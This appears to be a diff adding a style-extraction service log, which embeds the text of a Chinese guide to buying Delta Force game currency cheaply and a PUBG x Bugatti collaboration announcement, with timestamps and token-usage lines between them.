+## 三、获取途径
+
+目前强烈推荐的是【350~390】的价格，超过此价格不建议购买；
+
+1）官方648充值可得8100三角币（约8折），520元折算后416元，超过390建议自充；
+
+2）警惕低价陷阱，人家能卖高价为什么平白无故卖你低价？
+
+**2、心悦俱乐部充值（推荐指数：★★★★）**
+
+心悦俱乐部是当前腾讯系游戏官方充值最优惠的地方；
+
+[![心悦俱乐部尊享商场位置](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 位置∶首页 - 顶部尊享商场
+
+**1）悦享卡【月卡制】- 需要每天APP内签到**
+
+①**98档（73折）**，980币+量子密钥(60币) + 10币 * 30天，一共可得1340币，98 / 1340  ≈ 73折（要满勤）
+
+②**198档（75折）**，1980币+量子密钥(60币) + 20币 * 30天，一共可得2640币，198 / 2640 ≈ 75折（要满勤）
+
+[![心悦俱乐部悦享卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 你今天的悦享卡领了吗！
+
+[![心悦俱乐部活动宣传](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 每月保留节目
+
+**2）小黑卡 【日购制，每天两次】**
+
+①**98档（85折）**，1080币+量子密钥(60币)+俱乐部时尚小垃圾
+
+[![心悦俱乐部小黑卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 应急卡
+
+**3）盛夏狂欢季 - 限时活动（已结束）**
+
+①0.05R购买小黑卡98-5优惠券  
+②0.08R购买198-8优惠券  
+③R购买648-32优惠券（每次大更新都有648减免活动，这次没买到不知道价格）  
+④星愿币抽奖应该能拿到1元/10元现金兑换券
+
+[![盛夏狂欢季活动宣传](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 每次大更新都有这种活动
+
+**4）全新赛季-破壁 - 限时活动（已结束）**
+
+①商城满100-5优惠券，免费  
+②悦享卡满98-5优惠券，免费
+
+[![全新赛季-破壁活动1](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+[![全新赛季-破壁活动2](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+=============================
+
+3、淘宝赠礼（中风险，零性价比）
+
+价格问题，一般超过8折不建议；
+
+=============================
+
+4、市场出售高价皮肤（中风险，禁市场）
+
+风险较高，市场交易异常警告！
+
+参考文献∶求助
+
+[![异常警告截图](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 悲剧
+
+=============================
+
+5、全平台代充（高风险，余额变负）
+
+不接受，详情阅读用户条款，风险较高，容易被追缴
+
+> 充别怂，被洗别叫，被封别闹
+
+参考文献∶被洗号了怎么办
+
+=============================
+
+6、市场抢枪皮赌合成（高风险，不建议）
+
+即市场抢购S4 或 S5赛季的紫色品质皮肤 *20 合成一个金色皮肤；类似CS炼金
+
+[![市场抢购合成过程](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 已连续9把优品，量力而行
+
+> **第一幕：雄心壮志**
+>
+> "这次一定要抢到S级！"你摩拳擦掌守在电脑前，手指悬在左键上方疯狂点击。倒计时结束的瞬间——
+>
+> "怎么回事？关注了这么多S，怎么一个都抢不到啊？！"
+>
+> **第二幕：退而求其次**
+>
+> "算了算了，肯定全是脚本S抢不到正常，A也行吧..."你擦了擦汗，调整策略准备第二轮。结果——
+>
+> "不是吧！A怎么也抢不到？！怎么全是假购买，被槟榔做局了，哎资本"
+>
+> **第三幕：彻底崩溃**
+>
+> 看着空空如也的重组界面，你颤抖着点开B级页面：
+>
+> "要不......B？"
+>
+> **最终幕：人间真实**
+>
+> 第二天，你在小黑盒看到有人晒出合成的气象感应极品S腾龙，配文："随便点点就抢到了20个S，1打19出极品S很难吗？"
+>
+> 你默默退出软件，打开心悦俱乐部，“648->充值”，优品QBZ
+
+=============================
+
+总结：360~390赠礼可买，超过的建议心悦俱乐部充值或自己搬砖；
+
+=============================
+
+祝大家局内把把出红合成把把极品
+
+[![吸欧气2打18](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 吸口朋友2打18的欧气
+
+[![三角洲行动北极星、新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)
+2025-09-23 15:00:57.263 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：5531字
+2025-09-23 15:01:37.946 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 4214 input + 2582 output = 6796 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:55354 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 15:01:50.385 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：### PUBG x Bugatti
+
+#### ANNOUNCEMENT
+2025.08.13
+
+**※ All featured items may become available again at a later date via the Workshop, Your Shop, or other in-game features, as well as various events and promotions.**  
+※ The sales periods shown below are subject to change.
+
+---
+
+### Bugatti in PUBG: BATTLEGROUNDS
+
+The hyper sports car that transcends all limits of luxury and performance — the incomparable Bugatti Chiron roars across the Battlegrounds.
+
+Bugatti, designer of hyper sports cars combining elegance and performance, is more than just a car brand. For over a century, it has defined the pinnacle of design, speed, and technology without compromise. Hand-assembled in Molsheim, France, every Bugatti embodies the brand’s ethos of excellence in design and engineering, captivating enthusiasts around the world.
+
+Even in the earliest days of handcrafted automobiles, Bugatti stood out with unmatched precision and innovation. Its legacy is simply incomparable.
+
+Through the PUBG x Bugatti collaboration, players can take the wheel of the Chiron, the ultimate symbol of performance and comfort. A modern reinterpretation of Bugatti’s iconic history, the Chiron pushes boundaries beyond imagination, combining sophisticated design, performance-oriented form, and a whole new dimension of comfort. **With only 500 units ever made, the Chiron’s striking presence and elegance now await you on the Battlegrounds.**
+
+Step into the world of PUBG x Bugatti, where every drive defies expectations — because nothing else compares.
+
+*If comparable, it is no longer Bugatti.*
+
+---
+
+## Collaboration: Bugatti
+
+### Bugatti Container
+
+[![Bugatti Container](https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/a6UPhaTU.jpg)
+
+- An exclusive Bugatti container is available on the starting islands of Erangel, Miramar, Sanhok, Vikendi, Taego, Deston, and Rondo.
+- The container can only be unlocked by players who own Bugatti skins.
+    + If multiple Bugatti skins are concurrently equipped, the system will randomly select one to display.
+- Only the player who unlocks the container and their teammates can operate or ride in the Bugatti vehicle.
+- This feature can be utilized from the start of the match until players board the plane; once they do, the previously positioned container and the Bugatti vehicle will disappear.
+- Available in Normal Match, Ranked, and Casual Mode.
+- The Bugatti containers are available for one month.
+
+---
+
+## Special Vehicle Skins: Bugatti
+[![Bugatti Special Vehicle Skin](https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/oHJugUBJ.jpg)
+
+Details on the Bugatti Special Vehicle skins are as below.
+
+***※ Special Vehicle skins transform the existing vehicles to reflect the designs of the actual vehicles, and these Special Vehicle skins are developed to ensure a faithful representation of the actual vehicle's 3D modeling. Please note that equipping the Bugatti Special Vehicle skins may result in slight alterations to the base vehicle's size and appearance. These alterations are similar to those of the previous Special Vehicle skins.***
+
+#### Common Features
+
+- When equipping a Special Vehicle skin, the following effects will apply:
+    + Vehicle appearance is changed.
+    + Vehicle sounds, such as driving/honking sounds, are changed.
+- Even after equipping the Special Vehicle skin, HP, performance, weight, fuel level, driving method, etc. are maintained based on the condition of the vehicle before equipping the skin.
+- Lobby animations are applied for each skin.
+- The signature number badge is displayed on the front horseshoe grill when certain paint items are applied.
+
+##### Carbon Fiber
+
+- Parts of the vehicle’s rear and engine cover are made of carbon fiber.
+- Carbon fiber is a penetrable material, allowing bullets to pass through and inflict damage upon the player.
+    + If the player is shot through the carbon fiber material, both the vehicle and the player will take damage.
+    + Damage is applied to the vehicle when the bullet penetrates the carbon fiber area, but there is no additional damage caused by the bullet hitting the inside of the vehicle post-penetration.
+- The carbon fiber material can only be penetrated by bullets.
+
+#### "Chiron" Sports Car
+
+- Applicable vehicle: Coupe RB
+- Boost effect is applied.
+
+#### "Chiron (Édition Spéciale)" Sports Car
+
+- Applicable vehicle: Coupe RB
+
+##### Special Features
+
+- Active Rear Wing
+    + The rear spoiler will be activated upon reaching a certain speed.
+    + The function cannot be canceled after activation.
+    + When the rear spoiler is activated, applying the brakes changes its angle.
+- Custom Boost effect
+- Custom Boost sound
+
+---
+
+## Workshop: Bugatti
+
+Want the full PUBG x Bugatti experience? Check out the Workshop to make it yours.
+
+### Loot Cache Fragment
+
+- Collect 10 Bugatti Loot Cache Fragments to craft one Bugatti Loot Cache at Workshop - Regular Crafting.
+- Various events where you can earn Bugatti Loot Cache Fragments are available. Check the **August Special Drops announcement** for all the details!
+
+### Special Crafting
+
+Head to the Workshop → Special Crafting to craft special Bugatti items. Don't miss out on the Special Crafting exclusive items!
+
+- Special Vehicle skins along with exclusive customizable items have been added to the Workshop.
+- A total of 27 items are craftable with Bugatti Tokens at Special Crafting.
+
+[![Bugatti Special Crafting](https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/yULgeuQP.jpg)
+
+#### Special Crafting Closing Date (UTC)
+
+※ The Special Crafting - Bugatti Crafting tab will be accessible only until the following dates. Make sure to use up your Tokens before the closing date!
+
+- PC: September 15, 00:00
+- Console: September 23, 00:00
+
+#### Craftable Items
+
+***※ The Carbon Wrap paints only affect the vehicle’s color. These paints are purely cosmetic and not related to the penetrable carbon fiber material.***
+
+部分外观展示：
+
+- Chiron (Édition Spéciale) Full Set (Giallo & Dark Blue)
+    [![Chiron Giallo & Dark Blue](https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/uf5EtvRQ.png)
+- Chiron (Édition Spéciale) Exterior Set (French Racing Blue & Le Patron)
+    [![Chiron French Racing Blue & Le Patron](https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/LDZ24OuA.png)
+- Chiron (Édition Spéciale) Exterior Set (Italian Red & Black)
+    [![Chiron Italian Red & Black](https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/abRN2Kvw.png)
+- Chiron (Édition Spéciale) Exterior Set (Phantom Chrome & Black)
+    [![Chiron Phantom Chrome & Black](https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/leMchxPA.png)
+- Chiron Exterior Set (Ruby)
+    [![Chiron Ruby](https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png)](https://wstatic-prod-boc.krafton.com/common/news/20250812/xtbdN7Ei.png)
+
+#### Special Disassembly
+
+- Earn Bugatti Tokens through Special Disassembly by disassembling Imprints obtainable from the Bugatti Prime Parcel.
+    + You can choose between Regular Disassembly or Special Disassembly in Workshop - Regular Crafting - Craft tab.
+
+***※ The Chiron (Édition Spéciale) Paint (Black Carbon Wrap) is only obtainable from the Bugatti Prime Parcel.***
+
+---
+
+## Store
+
+Check out the Bugatti Step Up Packs, available at up to 80% off and now featuring 5 sets. Also, don’t forget the Loot Cache Packs!
+
+### Step Up Packs
+[![Bugatti Step Up Packs](https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/9Fpsru0q.jpg)
+
+*Due to legal regulations, the Step Up Packs are not available for purchase in Belgium and the Netherlands.*
+
+***All items in the Step Up Packs can be purchased once per account.***
+
+#### Sales Period (UTC)
+
+- PC: August 13, after live server maintenance - September 10, 00:00
+- Console: August 21, after live server maintenance - September 18, 00:00
+
+### Loot Cache Packs
+[![Bugatti Loot Cache Packs](https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg)](https://wstatic-prod-boc.krafton.com/common/news/20250812/asxSrz4U.jpg)
+
+*Due to legal regulations, the Loot Cache Packs are not available for purchase in Belgium and the Netherlands.*
+
+***The Currency Selection feature is available for the Bugatti Loot Cache Pack (x1), allowing you to purchase up to 50 using either G-Coin or BP.***
+
+#### Sales Period (UTC)
+
+- PC: August 13, after live server maintenance - September 10, 00:00
+- Console: August 21, after live server maintenance - September 18, 00:00
+
+#### Bugatti Token Expiry Date (UTC)
+
+※ Expired tokens disappear and cannot be exchanged or refunded.
+- PC: September 15, 00:00
+- Console: September 23, 00:00
+
+#### Preview
+
+- Previews are available for all items included in the Loot Cache Packs.
+- Expiry dates for Bugatti Tokens are displayed in the Store preview.
+
+---
+
+Command the Battlegrounds with incomparable elegance and performance.
+
+Meet PUBG x Bugatti.
+
+作者：PUBG: BATTLEGROUNDS Team  
+发布日期：2025.08.13
+2025-09-23 15:01:50.385 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：9484字
+2025-09-23 15:02:34.762 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 3673 input + 2465 output = 6138 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:36920 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 21:00:27.994 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：{"ret_code":0,"msg":"","content":"三角洲电锯/北极星氪金指南：低成本拿下，别当大冤种！！\n\n[![大肥羊玖崇头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)\n作者：大肥羊玖崇　Lv.21  \n发布日期：2025-07-05  \n地区：湖南\n\n[![三角洲行动Banner](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)  \n三角洲行动\n\n> 官方直充648元享8折优惠，当前合理赠礼价格为350-390元。价格过高不建议购买，自行充值更为划算。后续推出的联动皮肤抽奖内容无法通过赠礼获得。\n\n## 一、货币概念\n\n1. **三角币**：RMB充值后获取的货币，1:10；可购买市场、通行证、三角券物品；\n2. **三角券**：通行证返利、市场出售枪皮；可购买捆绑包，不可购买市场物品；\n3. **曼德尔币**：三角币1：1购买，可购买任意曼德尔砖。\n\n## 二、赠礼规则\n\n> 1. **双方要求**：\n>   * 等级 ≥ 20\n>   * 好友关系 ≥ 24小时 × 5天\n> 2. **次数限制**：\n>   * 卖家：每月最多赠5次，总价低于3W券\n>   * 买家：每月最多收5次，总价低于3W券\n> 3. **通行证赠礼**：仅能用【三角币】赠送\n\n## 三、获取途径\n\n目前强烈推荐的是【350~390】的价格，超过此价格不建议购买；\n\n1）官方648充值可得8100三角币（约8折），520元折算后416元，超过390建议自充；\n\n2）警惕低价陷阱，人家能卖高价为什么平白无故卖你低价？\n\n### 心悦俱乐部充值（推荐指数：★★★★）\n\n心悦俱乐部是当前腾讯系游戏官方充值最优惠的地方。\n\n[![心悦俱乐部尊享商场位置](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n位置∶首页 - 顶部尊享商场\n\n#### 1）悦享卡【月卡制】- 需要每天APP内签到\n\n①98档（73折），980币+量子密钥(60币) + 10币\\*30天，可得1340币，98/1340 ≈ 73折（需满勤）  \n②198档（75折），1980币+量子密钥(60币) + 20币\\*30天，可得2640币，198/2640 ≈ 75折（需满勤）\n\n[![悦享卡界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n你今天的悦享卡领了吗！\n\n[![每月保留节目](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n\n#### 2）小黑卡 【日购制，每天两次】\n\n①98档（85折），1080币+量子密钥(60币)+俱乐部时尚小垃圾\n\n[![小黑卡界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)  \n应急卡\n\n#### 3）盛夏狂欢季 - 限时活动（已结束）\n\n①0.05R购买小黑卡98-5优惠券  \n②0.08R购买198-8优惠券  \n③\\*R购买648-32优惠券（每次大更新都有648减免活动，这次没买到不知道价格）  \n④星愿币抽奖能拿到1元/10元现金兑换券\n\n[![盛夏狂欢季活动海报](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/33a9326964933dbf90270df5b0b6d023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n每次大更新都有这种活动\n\n#### 4）全新赛季-破壁 - 限时活动（已结束）\n\n①商城满100-5优惠券，免费  \n②悦享卡满98-5优惠券，免费\n\n[![全新赛季-破壁活动](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/a03761a5ce7a18b39e1df04f594e148d/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n每次大更新都有这种活动\n\n[![更新活动界面1](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1b8af107d1dadc9067a24eab148017e5/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n每次大更新都有这种活动\n\n=============================\n\n3、淘宝赠礼（中风险，零性价比）  \n价格问题，一般超过8折不建议；\n\n=============================\n\n4、市场出售高价皮肤（中风险，禁市场）  \n风险较高，市场交易异常警告！\n\n参考文献：求助\n\n[![悲剧](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/c4db34d6c46669c81bb73fe8caa0e833/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n悲剧\n\n=============================\n\n5、全平台代充（高风险，余额变负）  \n不接受，详情阅读用户条款，风险较高，容易被追缴\n\n> 充别怂，被洗别叫，被封别闹\n\n参考文献：被洗号了怎么办[cube_哭泣...]\n\n=============================\n\n6、市场抢枪皮赌合成（高风险，不建议）  \n即市场抢购S4或S5赛季的紫色品质皮肤*20合成一个金色皮肤；类似CS炼金\n\n[![合成过程界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/01604eed54b01517d232a7bab617698b/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n已连续9把优品，量力而行\n\n> **第一幕：雄心壮志**  \n> \"这次一定要抢到S级！\"你摩拳擦掌守在电脑前，手指悬在左键疯狂点击。倒计时结束的瞬间——  \n> \"怎么回事？关注了这么多S，怎么一个都抢不到啊？！\"\n> \n> **第二幕：退而求其次**  \n> \"算了算了，肯定全是脚本S抢不到正常，A也行吧...\"你擦了擦汗，调整策略准备第二轮。结果——  \n> \"不是吧！A怎么也抢不到？！怎么全是假购买，被槟榔做局了，哎资本\"\n> \n> **第三幕：彻底崩溃**  \n> 看着空空如也的重组界面，你颤抖着点开B级页面：  \n> \"要不......B？\"\n> \n> **最终幕：人间真实**  \n> 第二天，你在小黑盒看到有人晒出合成的气象感应极品S腾龙，配文：\"随便点点就抢到了20个S，1打19出极品S很难吗？\"\n> 你默默退出软件，打开心悦俱乐部，“648->充值”，优品QBZ\n\n=============================\n\n**总结：**  \n360~390赠礼可买，超过建议心悦俱乐部充值或自己搬砖；\n\n=============================\n\n祝大家局内把把出红合成把把极品\n\n[![朋友欧气](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/cb88c6e7ae0b4443aacf453f0f4db768/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)\n吸口朋友2打18的欧气\n\n[![三角洲行动北极星](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  \n三角洲行动北极星\n\n[![三角洲新赛季](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)](https://imgheybox.max-c.com/oa/2024/07/30/912b6ed8dba7f938a45fe00bddc0d697.png)  \n三角洲新赛季"}
+2025-09-23 21:00:27.994 | INFO     | preprocess.article_analyzer:analyze_article:43 - 文章读取完成，总长度：6148字
+2025-09-23 21:01:07.348 | INFO     | preprocess.article_analyzer:analyze_article:46 - 文风特征提取完成
+Token usage: 4605 input + 2448 output = 7053 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:53152 - "POST /extract-style HTTP/1.1" 200 OK
+2025-09-23 21:28:42.683 | INFO     | preprocess.article_analyzer:analyze_article:41 - 开始读取文章：三角洲电锯/北极星氪金指南：低成本拿下，别当大冤种！！
+
+[![作者头像](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)](https://imgheybox.max-c.com/avatar/2025/06/06/150875fb66c1d122b76c22ff5c0e75c3.jpeg?imageMogr2/thumbnail/100x100%3E)  
+大肥羊玖崇  
+Lv.21  
+2025-07-05 · 湖南
+
+[![三角洲行动](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)](https://cdn.max-c.com/heybox/dailynews/img/4dca5e8dcfc1f18b549f500e49ae4c4e.png)  
+三角洲行动
+
+> 官方直充648元享8折优惠，当前合理赠礼价格为350-390元。价格过高不建议购买，自行充值更为划算。后续推出的联动皮肤抽奖内容无法通过赠礼获得。
+
+## 一、货币概念
+
+1. 三角币：RMB充值后获取的货币，1:10； 可购买：市场、通行证、三角券物品；
+2. 三角券：通行证返利、市场出售枪皮; 可购买：捆绑包，不可购买市场物品
+3. 曼德尔币：三角币1:1购买 可购买：任意曼德尔砖
+
+## 二、赠礼规则：
+
+> 1. **双方要求**：
+>
+>    * 等级 ≥ 20
+>    * 好友 ≥ 24小时 × 5天
+> 2. **次数限制**：
+>
+>    * 卖家：每月最多赠5次<3W券总价
+>    * 买家：每月最多收5次<3W券总价
+> 3. **通行证赠礼**：仅能用 【三角币】 赠送
+
+## 三、获取途径
+
+目前强烈推荐的是【350~390】的价格，超过此价格不建议购买；
+
+1）官方648充值可得8100三角币（约8折），520元折算后416元，超过390建议自充；
+2）警惕低价陷阱，人家能卖高价为什么平白无故卖你低价？
+
+**2、心悦俱乐部充值（推荐指数：★★★★）**
+
+心悦俱乐部是当前腾讯系游戏官方充值最优惠的地方；
+
+[![心悦俱乐部尊享商场入口](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/1f9ab237d608e6bac0f951329dfe0023/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 位置∶首页 - 顶部尊享商场
+
+**1）悦享卡【月卡制】- 需要每天APP内签到**
+
+①98档（73折），980币+量子密钥(60币) + 10币 * 30天，一共可得1340币，98 / 1340  ≈ 73折（要满勤）  
+②198档（75折），1980币+量子密钥(60币) + 20币 * 30天，一共可得2640币，198 / 2640 ≈ 75折（要满勤）
+
+[![悦享卡领取界面](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/79ffe85560b00e10da4cfd7cd043c481/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 你今天的悦享卡领了吗！
+
+[![每月保留节目](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/05/0adfa27c51d1a485e329235cd68dc736/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 每月保留节目
+
+**2）小黑卡 【日购制，每天两次】**
+
+①98档（85折），1080币+量子密钥(60币)+俱乐部时尚小垃圾
+
+[![小黑卡应急卡](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)](https://imgheybox.max-c.com/web/bbs/2025/07/04/7a735046e65ad4735bfaea39c4457cbc/thumb.png?imageMogr2/format/webp/quality/50/auto-orient/ignore-error/1)
+
+#### 应急卡
+
+**3）盛夏狂欢季 - 限时活动（已结束）**
+
+①0.05R购买小黑卡98-5优惠券  
+②0.08R购买198-8优惠券  
+③***R购买648-32优惠券（每次大更新都有648减免活动，这次没买到不知道价格）  
+④星愿币抽奖应该能拿到1元/10元现金兑换券
+
